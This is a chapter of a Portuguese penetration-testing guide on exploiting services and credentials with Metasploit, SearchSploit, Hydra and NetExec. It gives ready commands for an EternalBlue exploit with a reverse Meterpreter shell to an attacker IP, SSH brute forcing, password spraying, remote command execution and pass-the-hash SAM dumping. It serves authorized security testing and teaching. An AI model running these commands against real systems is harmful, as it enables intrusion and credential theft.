---
description: "Ferramentas para exploração autorizada de serviços de rede, credenciais e bancos de dados."
---

# 5. Exploração de Serviços e Bancos de Dados

Esta fase representa o ponto de transição entre a identificação teórica de falhas e a obtenção prática de acesso não autorizado. O objetivo é operacionalizar as vulnerabilidades mapeadas nas fases anteriores através da execução de *exploits*, ataques de injeção e tentativas de autenticação, culminando no comprometimento inicial (*Initial Access*) de um serviço, host ou banco de dados.

## 5.1 Metasploit Framework — v6.4.145

* **Descrição Acadêmica/Técnica:** O Metasploit Framework, mantido pela Rapid7 e desenvolvido primariamente em Ruby, é a plataforma de exploração modular mais consolidada da indústria, estruturando o ciclo completo de um ataque em componentes reutilizáveis e interoperáveis. Em baixo nível, sua arquitetura é dividida em módulos de *exploits* (código que abusa de uma vulnerabilidade específica), *payloads* (a carga útil executada após o sucesso, ex: *reverse shells*), *encoders* (ofuscação de *payloads* para evasão de antivírus/IDS) e *auxiliary* (varreduras e utilitários que não necessariamente concedem acesso). O componente central de pós-exploração, o Meterpreter, é um *payload* avançado que opera inteiramente em memória (*in-memory*, sem tocar o disco), comunicando-se com o atacante através de um canal criptografado e extensível dinamicamente via carregamento de novas funcionalidades (*stagers* e *stages*) sem a necessidade de reconexão.
* **Principais Funcionalidades:**
  * Repositório massivo e constantemente atualizado de *exploits* para vulnerabilidades conhecidas (CVEs) em múltiplas plataformas.
  * Geração de *payloads* customizados e multiplataforma via *msfvenom* (Windows, Linux, Android, macOS, Web).
  * Meterpreter: *shell* avançado de pós-exploração operando em memória, com suporte a *pivoting*, captura de tela e *keylogging*.
  * Banco de dados integrado (PostgreSQL) para correlação de *hosts*, serviços e credenciais descobertas entre sessões.
  * Módulos *auxiliary* para varredura, *fuzzing* e ataques de força bruta sem necessidade de um *exploit* dedicado.

**Sintaxe e Comandos Principais:**

```bash
# Inicialização da console interativa principal (requer banco de dados ativo)

msfconsole

# Dentro da console: busca, seleção e configuração de um módulo de exploit

search [termo_ou_cve]

use [caminho/do/exploit]

show options

set RHOSTS [IP_do_alvo]

set LHOST [IP_do_atacante]

set PAYLOAD [caminho/do/payload]

exploit

# Geração de um payload standalone (reverse shell) via msfvenom para entrega manual

msfvenom -p [payload] LHOST=[IP_atacante] LPORT=[porta] -f [formato_saida] -o [arquivo_saida]
```

**Exemplo Prático de Aplicação:**
- **Cenário:** Durante um *Internal Pentest*, o Nmap identificou que um servidor Windows Server 2008 legado (10.0.5.22) expõe a porta 445 com a assinatura vulnerável ao MS17-010 (EternalBlue). O objetivo é obter execução remota de código e estabelecer uma sessão interativa persistente para iniciar a fase de pós-exploração.
- **Comandos Executados:**

```bash
msfconsole -q

use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS 10.0.5.22

set LHOST 10.0.5.100

set PAYLOAD windows/x64/meterpreter/reverse_tcp

exploit
```

- **Resultado Esperado:** O módulo verificará a exploração da falha na pilha SMBv1 do kernel, injetará o *shellcode* correspondente e estabelecerá um *handler* na porta configurada. Ao concluir com sucesso, uma sessão Meterpreter (meterpreter >) será apresentada no terminal, concedendo ao analista execução de comandos com privilégios de SYSTEM diretamente na memória do processo comprometido, sem qualquer gravação em disco.

## 5.2 SearchSploit — exploitdb 2026-06-09

* **Descrição Acadêmica/Técnica:** O SearchSploit é a ferramenta de linha de comando oficial para consulta *offline* ao *Exploit Database* (Exploit-DB), desenvolvida em *shell script* e Python, mantida pela Offensive Security. Em baixo nível, ela opera sobre uma cópia local espelhada (via Git) de todo o repositório de *exploits*, *shellcodes* e artigos técnicos do Exploit-DB, eliminando a dependência de conectividade com a internet durante engajamentos em redes segmentadas ou *air-gapped*. As consultas são processadas através de um índice de metadados estruturado em CSV (files_exploits.csv), permitindo buscas rápidas por título, plataforma, tipo de vulnerabilidade ou identificador CVE, retornando o caminho exato do código-fonte do *exploit* correspondente no sistema de arquivos local para inspeção ou execução imediata.
* **Principais Funcionalidades:**
  * Consulta integral e offline ao banco de dados do Exploit-DB, sem exposição de tráfego de busca à internet.
  * Filtragem granular de resultados por título, CVE, plataforma (Windows, Linux, PHP, etc.) e tipo (*remote, local, webapps, dos*).
  * Cópia direta (*mirroring*) do código-fonte do *exploit* para o diretório de trabalho atual, facilitando a customização.
  * Verificação cruzada e correlação com resultados de varreduras do Nmap (via *script* NSE nmap-vulners ou saída XML).

**Sintaxe e Comandos Principais:**

```bash
# Busca textual simples por um serviço, produto ou versão específica

searchsploit [termo_de_busca]

# Busca restrita a um identificador CVE específico

searchsploit --cve [numero_do_cve]

# Exibição do código-fonte completo do exploit diretamente no terminal

searchsploit -x [caminho_do_exploit]

# Cópia do exploit e de seus arquivos associados (mirror) para o diretório atual

searchsploit -m [caminho_do_exploit]
```

**Exemplo Prático de Aplicação:**
- **Cenário:** Após uma varredura com Nmap revelar que um servidor expõe o *ProFTPD* na versão 1.3.5, o analista precisa verificar rapidamente, sem depender de acesso à internet (rede isolada do cliente), se existe um *exploit* público documentado para essa versão específica antes de tentar o desenvolvimento manual de um vetor de ataque.
- **Comandos Executados:**

```bash
searchsploit proftpd 1.3.5

searchsploit -m unix/remote/36803.py
```

- **Resultado Esperado:** O SearchSploit retornará uma listagem tabular incluindo o *exploit* "ProFTPD-1.3.5 - Backdoor Command Execution" com seu caminho local correspondente. O segundo comando copiará o *script* Python do *exploit* (36803.py) para o diretório de trabalho atual, permitindo que o analista inspecione o código, ajuste o IP alvo diretamente na variável do *script* e o execute para obter uma *shell* reversa através do *backdoor* introduzido na *build* comprometida do servidor.

## 5.3 Hydra — v9.7

* **Descrição Acadêmica/Técnica:** O Hydra (THC-Hydra) é uma ferramenta de ataque de força bruta e dicionário *online*, escrita em C, projetada para testar credenciais de autenticação contra uma vasta gama de protocolos e serviços de rede em tempo real. Em baixo nível, sua arquitetura é fundamentada em *módulos de protocolo* independentes e um núcleo altamente paralelizado baseado em *threads* (pthreads), que estabelece múltiplas conexões TCP/UDP simultâneas contra o serviço alvo, submetendo combinações de usuário/senha e analisando o código de retorno ou a mensagem de resposta do *daemon* (ex: "530 Login incorrect" via FTP, ou o código de status HTTP de um formulário web) para inferir o sucesso ou falha da tentativa. Diferente de ataques *offline* contra hashes, o Hydra interage diretamente com o serviço em produção, tornando-o suscetível a mecanismos de defesa como *rate limiting*, *account lockout* e detecção por IDS/IPS.
* **Principais Funcionalidades:**
  * Suporte nativo a mais de 50 protocolos (SSH, FTP, RDP, SMB, HTTP-Form, MySQL, entre outros).
  * Execução paralela massiva de tentativas de autenticação através de controle granular de *threads* (-t).
  * Suporte a listas combinadas de usuário/senha (*combo lists*) e geração dinâmica via padrões de caracteres.
  * Modo de ataque específico para formulários web (http-post-form/http-get-form), com detecção de strings de falha customizadas.
  * Capacidade de retomada de ataques interrompidos (-R) e controle de *timing* para evasão de bloqueios por tentativas excessivas.

**Sintaxe e Comandos Principais:**

```bash
# Ataque de dicionário contra um serviço SSH utilizando um usuário fixo e uma wordlist de senhas

hydra -l [usuario] -P [wordlist_senhas.txt] [IP_do_alvo] ssh

# Ataque combinando listas de usuários e senhas contra um serviço FTP, com paralelismo elevado

hydra -L [usuarios.txt] -P [senhas.txt] -t 64 [IP_do_alvo] ftp

# Ataque de força bruta contra um formulário de login web (HTTP POST), identificando a string de falha

hydra -l [usuario] -P [wordlist_senhas.txt] [alvo.com] http-post-form "/login:usuario=^USER^&senha=^PASS^:F=Login invalido"
```

**Exemplo Prático de Aplicação:**
- **Cenário:** Durante um *Internal Pentest*, o analista identifica um servidor com o serviço SSH exposto (10.0.5.30) e, através de OSINT prévio, obteve uma lista de nomes de usuários corporativos plausíveis. O objetivo é validar se algum desses usuários utiliza senhas fracas presentes em uma *wordlist* de senhas vazadas conhecidas (rockyou.txt), respeitando um limite de paralelismo para não disparar o bloqueio de conta configurado no *Active Directory*.
- **Comando Executado:**

```bash
hydra -L usuarios_corporativos.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f 10.0.5.30 ssh
```

- **Resultado Esperado:** O Hydra iniciará tentativas sequenciais e controladas (4 *threads* simultâneas) contra o serviço SSH. Assim que uma combinação válida for encontrada, a opção -f interromperá imediatamente toda a execução, exibindo no terminal a mensagem "*login: [usuario] password: [senha]*", fornecendo credenciais válidas para acesso inicial autenticado ao servidor sem a necessidade de exploração de vulnerabilidades de software.

## 5.4 NetExec (NXC) — v1.5.1

* **Descrição Acadêmica/Técnica:** O NetExec, sucessor direto e mantido ativamente do descontinuado CrackMapExec (CME), é um *framework* de exploração e enumeração pós-comprometimento para ambientes *Active Directory*, desenvolvido em Python. Sua arquitetura é centrada na automação de tarefas administrativas em escala através dos protocolos SMB, WinRM, MSSQL, SSH e LDAP. Em baixo nível, a ferramenta implementa os protocolos de autenticação NTLM e Kerberos de forma nativa (sem depender de binários do sistema como o *smbclient*), permitindo a validação massiva e paralela de credenciais (senhas em texto claro, hashes NTLM ou tíquetes Kerberos) contra centenas de *hosts* simultaneamente. Sua extensibilidade modular embute funcionalidades avançadas de pós-exploração, como a extração remota do banco SAM/LSA, execução de comandos via WMI/SMBExec e coleta de dados para posterior análise de caminhos de ataque no BloodHound.
* **Principais Funcionalidades:**
  * Validação massiva e paralela de credenciais (*password spraying*) via SMB, WinRM, LDAP, MSSQL e SSH contra sub-redes inteiras.
  * Suporte nativo a autenticação *pass-the-hash* (NTLM) e *pass-the-ticket* (Kerberos), sem necessidade de conhecer a senha em texto claro.
  * Execução remota de comandos arbitrários em *hosts* comprometidos através de múltiplos métodos (WMI, SMBExec, ATExec).
  * Extração remota de hashes de credenciais armazenadas localmente (SAM) e em cache de domínio (LSA Secrets).
  * Arquitetura modular extensível (--module) para tarefas específicas, como coleta de dados para o BloodHound ou busca de arquivos sensíveis em compartilhamentos SMB.

**Sintaxe e Comandos Principais:**

```bash
# Validação de uma única credencial contra um bloco de rede via SMB, identificando hosts com admin local

nxc smb [bloco_IP_ou_CIDR] -u [usuario] -p [senha]

# Ataque de password spraying com uma lista de usuários contra uma única senha, sinalizando sucesso de admin

nxc smb [bloco_IP_ou_CIDR] -u [usuarios.txt] -p [senha_unica] --continue-on-success

# Execução remota de um comando em hosts autenticados com sucesso via SMB

nxc smb [IP_do_alvo] -u [usuario] -p [senha] -x [comando_a_executar]

# Extração remota do banco de credenciais SAM utilizando hash NTLM (pass-the-hash) em vez da senha

nxc smb [IP_do_alvo] -u [usuario] -H [hash_ntlm] --sam
```

**Exemplo Prático de Aplicação:**
- **Cenário:** Após a obtenção de uma credencial de usuário de domínio de baixo privilégio através de um ataque de *phishing*, o analista precisa verificar rapidamente em qual dos 200 servidores da rede corporativa (10.0.0.0/24) essa credencial concede privilégios administrativos locais, um passo essencial para identificar o próximo alvo de movimentação lateral.
- **Comando Executado:**

```bash
nxc smb 10.0.0.0/24 -u joao.silva -p 'Senha@2024' --continue-on-success
```

- **Resultado Esperado:** O NetExec tentará autenticar via SMB em cada *host* vivo da sub-rede simultaneamente. Para cada tentativa bem-sucedida, o terminal exibirá a linha correspondente em verde; caso a credencial também conceda privilégios administrativos locais naquele *host* específico, a ferramenta destacará explicitamente a marcação (Pwn3d!) ao lado do resultado, indicando um alvo prioritário e imediato para técnicas de *pass-the-hash* ou execução remota de comandos.
